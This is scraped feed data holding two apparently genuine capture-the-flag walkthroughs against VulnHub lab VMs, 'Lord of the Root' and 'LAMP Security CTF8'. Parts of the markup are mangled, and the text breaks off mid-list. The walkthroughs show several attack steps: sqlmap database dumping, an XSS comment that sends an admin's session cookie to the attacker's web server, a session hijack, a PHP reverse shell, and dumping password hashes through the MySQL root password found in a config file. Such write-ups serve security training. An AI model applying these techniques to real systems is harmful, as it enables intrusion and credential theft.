id=\"sqlmap\">SQLMAP</h2> \n<p>Thw following SQLMap commands were leveraged during the SQL enumeration and SQL injection database dumping.</p> \n<h3 id=\"sqlmap-enumerate-databases\">SQLMap Enumerate Databases</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># sqlmap -o -u http://192.168.30.140:1337/978345210/index.php --forms --dbs</span></code></pre> \n</figure> \n<h3 id=\"sqlmap-full-command\">SQLMap Full Command</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">         _\n___ ___| |_____ ___ ___  <span starting 4 processes \n<span class=\"o\">[</span>05:04:46] <span class=\"o\">[</span>INFO] cracked password <span class=\"s1\">'darkshadow'</span> <span class=\"k\">for </span><span class=\"nb\">hash</span>\n<span class=\"s1\">'*4dd56158acdba81bfe3ff9d3d7375231596ce10f'</span> </code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">Database: mysql\nTable: user\n<span class=\"o\">[</span>5 entries]\n+------------------+--------------------------------------------------------+\n| User             | Password class=\"k\">*</span>A55A9B9049F69BC2768C9284615361DFBD580B34              |\n| root             | <span class=\"k\">*</span>4DD56158ACDBA81BFE3FF9D3D7375231596CE10F <span <span class=\"nb\">exit\n</span>Bye</code></pre> \n</figure> \n<h2 id=\"root\">Root</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"> \nsmeagol@LordOfTheRoot:~<span class=\"nv\">$ </span>su -\nPassword: \nroot@LordOfTheRoot:~# <span class=\"nb\">whoami \n</span>root\nroot@LordOfTheRoot:~# <span class=\"nb\">id\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span></code></pre> \n</figure> \n<h2 id=\"root-flag\">Root Flag</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"> \nroot@LordOfTheRoot:~# <span class=\"nb\">cat</span> /root/Flag.txt \n“There is only one Lord of the Ring, only one <span class=\"nb\">who </span>can bend it to his will. And\nhe does not share power.”\n– Gandalf</code></pre> \n</figure> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Tue, 24 Nov 2015 00:12:52 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/lotr/base64-src.png","linkMd5":"7d7ecc18f8a36607eb66d892d67d55f8","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn53@2020_5/2020/08/25/01-24-54-493_d6d6a4ab42d86bc0.webp","destWidth":673,"destHeight":416,"sourceBytes":367394,"destBytes":34066,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/lotr/base64-src.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn53@2020_5/2020/08/25/01-24-54-493_d6d6a4ab42d86bc0.webp"},"publishedOrCreatedDate":1598318675550},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"LAMP Security CTF8 - Walkthrough","link":"https://highon.coffee/blog/lamp-security-ctf8-walkthrough/","description":"<div \n <li><a href=\"https://highon.coffee/blog/lamp-security-ctf8-walkthrough/#xss-session-id-hijacking\" id=\"markdown-toc-xss-session-id-hijacking\">XSS Session ID Hijacking</a> \n  <ul> \n   <li><a </li> \n <li><a href=\"https://highon.coffee/blog/lamp-security-ctf8-walkthrough/#reverse-shell\" id=\"markdown-toc-reverse-shell\">Reverse Shell</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/lamp-security-ctf8-walkthrough/#hashcat-md5-cracking\" id=\"markdown-toc-hashcat-md5-cracking\">Hashcat MD5 cracking</a></li> \n <li><a href=\"https://highon.coffee/blog/lamp-security-ctf8-walkthrough/#hydra-ssh-brute-force\" id=\"markdown-toc-hydra-ssh-brute-force\">Hydra SSH Brute Force</a></li> \n <li><a href=\"https://highon.coffee/blog/lamp-security-ctf8-walkthrough/#ssh-account-compromise\" id=\"markdown-toc-ssh-account-compromise\">SSH Account Compromise</a></li> \n <li><a href=\"https://highon.coffee/blog/lamp-security-ctf8-walkthrough/#local-privilege-escalation\" id=\"markdown-toc-local-privilege-escalation\">Local Privilege Escalation</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>The LAMPSecurity project is an effort to produce training and benchmarking tools that can be used to educate information security professionals and test products.</p> \n<p><strong>Author:</strong> madirish2600</p> \n<p><strong>Download:</strong> <a href=\"https://www.vulnhub.com\">VulnHub</a></p> \n<h2 id=\"enumeration\">Enumeration</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 192.168.30.135</code></pre> \n</figure> \n<div class=\"note info\"> \n <h5>Dislcaimer: Multiple Entry Points</h5> \n <p>The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the <b>web application</b> as the entry point.</p> \n</div> \n<h3 id=\"host-service-enumeration\">Host Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 21</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>FTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>vsftpd 2.0.5</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 4.3 (protocol 2.0)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 25</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SMTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Sendmail</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.3 ((CentOS))</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 110</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>POP3</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Dovecot pop3d</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 111</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>rpcbind</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>N/A</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 139</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Netbios</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Samba smbd 3.X (workgroup: WORKGROUP)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 143</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>IMAP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Dovecot imapd</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 443</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTPS</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.3 ((CentOS))</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 445</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Netbios</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Samba smbd 3.X (workgroup: WORKGROUP)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 938</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>TCP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>N/A</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 993</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>IMAP SSL</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Dovecot imapd</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 995</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>POP3 SSL</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Dovecot pop3d</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 3306</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>MySQL</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>MySQL (unauthorized)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 5801-5804</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>VNC HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5901)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 5901-5904</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>VNC</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>VNC (protocol 3.8)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 6001-6004</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>X11</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>X11</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"inspection-of-the-web-application\">Inspection of the Web Application</h2> \n<p>As with the previous CTF series VM’s, I’ve chosen to ignore other entry points and focus on the <strong>web application</strong> is used for the entry point.</p> \n<p>Inspection of the web application revealed it was vulnerable to XSS (Cross Site Scripting):</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf8/xss.png\" alt=\"XSS\" /></p> \n<p>Confirmed:</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf8/xss-alert.png\" alt=\"XSS Alert\" /></p> \n<h2 id=\"xss-session-id-hijacking\">XSS Session ID Hijacking</h2> \n<p>From insepecting the web application it appeared <code>Barbara</code> was an admin, a guess based on her user activity. A XSS comment was placed on one of the pages Barbara had created and an email was sent to Barbara instructing her to view the page.</p> \n<p>The XXS script will execute and attempt to contact a web server on the attacking machine, the url will disclose <strong>Barbara’s</strong> session ID.</p> \n<p>Once the ID has been obtained, <strong>Cookie Manager+</strong> Firefox plugin or <strong>Burp Suite</strong> is used to manipulate the stored cookie and replace the session ID with Barbara’s, hijacking Barbara’s session.</p> \n<h3 id=\"xss-comment\">XSS Comment</h3> \n<p>Joomla required a user to preview a comment before saving, in this case the XSS executes and Joomla fails to save the comment. To evade this behavior, a normal comment was posted, then edited to include the XSS snipet.</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf8/xss-cookie-hijack.png\" alt=\"XSS Cookie Hijacking\" /></p> \n<h3 id=\"http-server\">HTTP Server</h3> \n<p>A HTTP server was setup on attacking machine: <code>python -m SimpleHTTPServer 80</code></p> \n<h3 id=\"email-barbara-victim\">Email Barbara (victim)</h3> \n<p><img src=\"https://highon.coffee/img/blog/ctf8/email-barbara.png\" alt=\"XSS Link Email Victim\" /></p> \n<p>After a couple of minutes the following appeared in the web server logs:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">192.168.221.135 - - <span class=\"o\">[</span>05/05/2014 10:54:28] <span class=\"s2\">\"GET\n/?SESS2130d5ef479afc30ab5b3f3d50bbfc5e=9ehlga5fhnh8o81om1aq5so040;%20has_js=1\nHTTP/1.1\"</span> 301 -</code></pre> \n</figure> \n<p>Barbaras Session ID: <code>9ehlga5fhnh8o81om1aq5so040</code></p> \n<h3 id=\"swapped-session-id-burp-suite\">Swapped Session ID Burp Suite</h3> \n<p><img src=\"https://highon.coffee/img/blog/ctf8/burp-swap-session-id.png\" alt=\"Burp Swap Session ID\" /></p> \n<p><strong>Cookie Manager+</strong> and / or <strong>Tamper Data</strong> can also be used for this purpose.</p> \n<p>Successfuly logged in as Barbara:</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf8/login-barbara.png\" alt=\"Session Hijacked\" /></p> \n<h2 id=\"reverse-shell\">Reverse Shell</h2> \n<p>A reverse shell was injected into a new page using Barbara’s admin account:</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf8/php-reverse-shell.png\" alt=\"php reverse shell\" /></p> \n<h3 id=\"drupal-settingsphp\">Drupal settings.php</h3> \n<p>The following disclosed <code>settings.php</code> file for <strong>Drupal</strong> existed.</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf8/drupal-settings.png\" alt=\"Drupal Settings.php\" /></p> \n<p>File path: <code>/var/www/html/drupal/sites/default/settings.php</code></p> \n<p>The file contained the <strong>root</strong> account credentials for mysql.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-php\" data-lang=\"php\"><span class=\"o\">*/</span>\n\n<span class=\"nv\">$db_url</span> <span class=\"o\">=</span> <span class=\"s1\">'mysqli://root:JumpUpAndDown@localhost/drupal'</span><span class=\"p\">;</span>\n\n<span class=\"nv\">$db_prefix</span> <span class=\"o\">=</span> <span class=\"s1\">''</span><span class=\"p\">;</span></code></pre> \n</figure> \n<p>The following SQL was used to disclose the password hashes:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">/bin/sh <span class=\"nt\">-i</span>\n\nsh: no job control <span class=\"k\">in </span>this shell\n\nsh-3.2<span class=\"nv\">$ </span>mysql <span class=\"nt\">-u</span> root <span class=\"nt\">-p</span> drupal\nEnter password: JumpUpAndDown\n<span class=\"k\">select </span>name,pass from <span class=\"nb\">users</span><span class=\"p\">;</span>\n/q\nadmin     49265c16d1dff8acef3499bd889299d6\nBarbara     bed128365216c019988915ed3add75fb\nJim     2a5de0f53b1317f7e36afcdb6b5202a4\nSteve     08d15a4aef553492d8971cdd5198f314\nSherry     c3319d1016a802db86653bcfab871f4f\nGene     9b9e4bbd988954028a44710a50982576\nHarvey     7d29975b78825ea7c27f5c0281ea2fa4\nJohn     518462cd3292a67c755521c1fb50c909\nJohnathan ca594f739e257245f2be69eb546c1c04\nStacey     85aca385eb555fb6a36a62915ddd8bc7\nJuan     573152cc51de19df50e90b0e557db7fe\nMichael     c7a4476fc64b75ead800da9ea2b7d072\nJerome
